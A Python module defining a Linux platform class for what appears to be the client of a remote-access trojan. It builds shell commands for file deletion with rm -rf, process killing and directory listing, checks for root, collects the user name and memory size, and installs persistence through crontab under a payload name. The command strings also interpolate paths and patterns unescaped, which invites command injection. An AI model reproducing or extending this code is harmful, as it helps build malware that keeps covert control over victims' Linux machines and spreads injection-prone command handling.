import os

from client.platform.base import AbstractPlatform


class LinuxPlatform(AbstractPlatform):

    def list_dir_cmd(self, path=None):
        return f'ls -la "{path}"' if path else 'ls -la'

    def current_dir_cmd(self):
        return 'pwd'

    def delete_cmd(self, path, recursive=False):
        if recursive:
            return f'rm -rf "{path}"'
        return f'rm -f "{path}"'

    def move_cmd(self, src, dst):
        return f'mv "{src}" "{dst}"'

    def read_file_cmd(self, path):
        return f'cat "{path}"'

    def touch_cmd(self, path):
        return f'touch "{path}"'

    def process_list_cmd(self):
        return 'ps aux'

    def kill_process_cmd(self, pid):
        return f'kill -9 {pid}'

    def pkill_cmd(self, name):
        return f'pkill {name}'

    def network_info_cmd(self):
        return 'ifconfig'

    def install_persistence(self, reg_name, copy_name):
        from client.modules.persist import install_persistence
        return install_persistence('crontab', payload_name=copy_name)

    def get_appdata_path(self):
        return os.path.expanduser('~/.config')

    def check_admin(self):
        return '[+] Root' if os.geteuid() == 0 else '[-] Not root'

    def get_system_user(self):
        try:
            return os.getlogin()
        except Exception:
            return os.environ.get('USER', 'Unknown')

    def get_memory_info(self):
        try:
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    if line.startswith('MemTotal:'):
                        kb = int(line.split()[1])
                        gb = round(kb / (1024 ** 2), 2)
                        return f"Total RAM: {gb} GB"
        except Exception:
            pass
        return None

    def grep_cmd(self, pattern):
        return f'grep -r "{pattern}" .'

    def clear_screen_cmd(self):
        return 'clear'
